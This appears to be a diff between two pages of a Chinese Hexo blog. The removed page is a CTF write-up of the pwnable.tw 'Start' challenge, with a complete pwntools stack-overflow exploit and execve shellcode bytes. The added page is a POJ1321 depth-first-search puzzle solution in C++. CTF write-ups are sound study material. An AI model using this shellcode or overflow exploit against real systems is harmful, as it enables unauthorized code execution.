@@ -50,7 +50,7 @@
     
     <title>
         
-            pwnable.tw之Start | 
+            DFS-棋盘问题-POJ1321 | 
         
         冰刀
     </title>
@@ -61,7 +61,7 @@
 
     <meta name="format-detection" content="telephone=no">
     <meta name="description" itemprop="description" content="醉生梦死">
-    <meta name="keywords" content=",shellcode,pwnable">
+    <meta name="keywords" content=",DFS,POJ">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -222,7 +222,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="冰刀">
-    <meta name="msapplication-starturl" content="http://yoursite.com/2018/10/23/pwnable-tw之Start/">
+    <meta name="msapplication-starturl" content="http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="冰刀">
@@ -237,16 +237,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://yoursite.com/2018/10/23/pwnable-tw之Start/">
+    <meta property="og:url" content="http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="pwnable.tw之Start | 冰刀">
+    <meta property="og:title" content="DFS-棋盘问题-POJ1321 | 冰刀">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="醉生梦死">
-    <meta property="og:article:tag" content="shellcode"> <meta property="og:article:tag" content="pwnable"> 
+    <meta property="og:article:tag" content="DFS"> <meta property="og:article:tag" content="POJ"> 
 
     
-        <meta property="article:published_time" content="Tue Oct 23 2018 20:24:06 GMT+0800">
-        <meta property="article:modified_time" content="Wed Oct 24 2018 16:28:16 GMT+0800">
+        <meta property="article:published_time" content="Wed Oct 24 2018 15:49:52 GMT+0800">
+        <meta property="article:modified_time" content="Wed Oct 24 2018 16:28:42 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -254,7 +254,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html">
+        <link rel="canonical" href="http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html">
     
 
     <!-- Structured-data for SEO -->
@@ -266,10 +266,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html",
-    "headline": "pwnable.tw之Start",
-    "datePublished": "Tue Oct 23 2018 20:24:06 GMT+0800",
-    "dateModified": "Wed Oct 24 2018 16:28:16 GMT+0800",
+    "mainEntityOfPage": "http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html",
+    "headline": "DFS-棋盘问题-POJ1321",
+    "datePublished": "Wed Oct 24 2018 15:49:52 GMT+0800",
+    "dateModified": "Wed Oct 24 2018 16:28:42 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "IceKnife",
@@ -287,7 +287,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",shellcode,pwnable",
+    "keywords": ",DFS,POJ",
     "description": "醉生梦死",
 }
 </script>
@@ -352,7 +352,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Start"><span class="post-toc-number">2.</span> <span class="post-toc-text">Start</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#棋盘问题"><span class="post-toc-number">1.</span> <span class="post-toc-text">棋盘问题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Input"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Input</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Output"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Output</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Sample-Input"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Sample Input</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Sample-Output"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">Sample Output</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">解题思路</span></a></li></ol></li></ol>
     </ul>
     
 
@@ -384,7 +384,7 @@
         
     
             <p class="article-headline-p">
-                pwnable.tw之Start
+                DFS-棋盘问题-POJ1321
             </p>
         </div>
 
@@ -403,7 +403,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>IceKnife</strong>
-        <span>10月 23, 2018</span>
+        <span>10月 24, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -427,7 +427,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/pwnable/">pwnable</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/shellcode/">shellcode</a>
+        <a class="post_tag-link" href="/tags/DFS/">DFS</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/POJ/">POJ</a>
     </li></ul>
     
 
@@ -442,7 +442,7 @@
     <!-- Leancloud Views -->
         <a class="post_share-link" href="#">
             <li class="mdl-menu__item">
-                <span id="/2018/10/23/pwnable-tw之Start/" class="leancloud-views_num" data-flag-title="pwnable.tw之Start">
+                <span id="/2018/10/24/DFS-棋盘问题-POJ1321/" class="leancloud-views_num" data-flag-title="DFS-棋盘问题-POJ1321">
      &nbsp;浏览量
 </span>
 
@@ -454,7 +454,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=pwnable.tw之Start&url=http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html&pic=http://yoursite.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=DFS-棋盘问题-POJ1321&url=http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html&pic=http://yoursite.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -463,7 +463,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=pwnable.tw之Start&url=http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html&via=IceKnife" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=DFS-棋盘问题-POJ1321&url=http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html&via=IceKnife" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -472,7 +472,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -481,7 +481,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -493,7 +493,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=冰刀&title=pwnable.tw之Start&summary=醉生梦死&pics=http://yoursite.com/img/favicon.png&url=http://yoursite.com/2018/10/23/pwnable-tw之Start/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=冰刀&title=DFS-棋盘问题-POJ1321&summary=醉生梦死&pics=http://yoursite.com/img/favicon.png&url=http://yoursite.com/2018/10/24/DFS-棋盘问题-POJ1321/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -512,11 +512,23 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接触CTF的比赛多了之后，越觉得<strong>自古Misc、Web留不住，唯有二进制得人心！</strong><br>所以奋不顾身地投入了二进制的学习之中。在经历CTF从入门到放弃之后，觉得还是需要把学习过程放到博客上。这次也是写了个入门题的Writeup，希望以后能实时更新<del>，不要偷懒！！！</del></p>
-<p><img src="/2018/10/23/pwnable-tw之Start/汇编.jpg" alt="春药.jpg"></p>
-<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><p>拿到题目先来个三板斧，先<code>objdump -x</code>看看文件格式，然后<code>gdb &lt;filenmae&gt;</code>接一手<code>checksec</code>观察文件保护机制。最后放入IDA，<del>一道美味的pwn题就可以放弃了。</del>不得不说上来第一题还是很友好的，保护机制形同虚设。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure></p>
-<p>关于这些保护的详细描述网络上已经很多了，我们不多copy，直接开始解题。</p>
-<p><img src="/2018/10/23/pwnable-tw之Start/ida.jpg" alt="IDA运行结果"><br>先gdb运行一下看看程序的流程，用<code>b _start</code>下断点开始调试<br>发现在<code>int 0x80</code>需要输入，搜索了一下知道<code>int 0x80</code>是linux上的系统调用。<br>解题就是要莽！先写入20个a看看结果<br><img src="/2018/10/23/pwnable-tw之Start/20个a.jpg" alt="20个a"><br>发现它覆盖了ret的内容，那么思路就很明确了，<strong>覆盖返回地址为我们想要的区域，然后写入shellcode</strong><br>shellcode可以放到栈中，也就是esp中，但esp的地址又是变化的，这怎么办呢？<br>关键操作就是<code>mov ecx, esp</code>把esp的地址传给了ecx<br>我们第一次先利用该操作获得esp，第二次再把shellcode写入。<br>通过gdb易知<code>mov ecx, esp</code>这行地址为<em>0x8048087</em>，而我们输入的起始地址<em>0xffffd224</em>到返回地址<em>0xffffd238</em>刚好是20个字节。Payload1如下：<br><code>payload1 = &#39;a&#39;*20 + p32(0x8048087)</code><br>此时获得了esp地址，继续构造第二次的Payload即可，有一点需要注意的是<br><code>add esp, 14h</code>，这行操作使得esp的地址加上了0x14。<br><code>payload2 = &#39;a&#39;*20 + p32(20+addr) + shellcode</code><br>完整Payload如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./start'</span>)</span><br><span class="line"><span class="comment"># p = remote('chall.pwnable.tw', 10000)</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">20</span>+addr) + shellcode</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+        <h1 id="棋盘问题"><a href="#棋盘问题" class="headerlink" title="棋盘问题"></a>棋盘问题</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>在一个给定形状的棋盘（形状可能是不规则的）上面摆放棋子，棋子没有区别。要求摆放时任意的两个棋子不能放在棋盘中的同一行或者同一列，请编程求解对于给定形状和大小的棋盘，摆放k个棋子的所有可行的摆放方案C。</p>
+</blockquote>
+<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote>
+<p>输入含有多组测试数据。<br>每组数据的第一行是两个正整数，n k，用一个空格隔开，表示了将在一个n*n的矩阵内描述棋盘，以及摆放棋子的数目。 n &lt;= 8 , k &lt;= n<br>当为-1 -1时表示输入结束。<br>随后的n行描述了棋盘的形状：每行有n个字符，其中 # 表示棋盘区域， . 表示空白区域（数据保证不出现多余的空白行或者空白列）。 </p>
+</blockquote>
+<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote>
+<p>对于每一组数据，给出一行输出，输出摆放的方案数目C （数据保证C&lt;2^31）。</p>
+</blockquote>
+<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><blockquote>
+<p>2 1<br>#.<br>.#<br>4 4<br>…#<br>..#.<br>.#..<br>#…<br>-1 -1 </p>
+</blockquote>
+<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><blockquote>
+<p>2<br>1</p>
+</blockquote>
+<hr>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>一行行进行搜索，dfs两个参数，一个行号，一个当前的步数。<br>再用一个数组标记有棋子的列，总的来说还是很经典的dfs题目。<br>代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">char map[10][10];</span><br><span class="line">int book[10];</span><br><span class="line">int n, k;</span><br><span class="line">int sum;</span><br><span class="line"></span><br><span class="line">void dfs(int x, int step)</span><br><span class="line">&#123;</span><br><span class="line">    if (step == k)</span><br><span class="line">    &#123;</span><br><span class="line">        sum++;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = x; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        for (int j = 0; j &lt; n; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            if (map[i][j] == &apos;#&apos; &amp;&amp; book[j] != 1)</span><br><span class="line">            &#123;</span><br><span class="line">                book[j] = 1;</span><br><span class="line">                dfs(i+1, step+1);</span><br><span class="line">                book[j] = 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    while(scanf(&quot;%d %d&quot;, &amp;n, &amp;k) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        if (n==-1 &amp;&amp; k==-1)</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        sum = 0;</span><br><span class="line">        memset(book, 0, sizeof(book));</span><br><span class="line">        for (int i = 0; i &lt; n; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;map[i];</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(0, 0);</span><br><span class="line">        cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 
         
     
@@ -537,21 +549,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/10/24/DFS-棋盘问题-POJ1321/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/10/19/Hello-Hexo/" id="post_nav-older" class="next-content">
+        <a href="/2018/10/23/pwnable-tw之Start/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
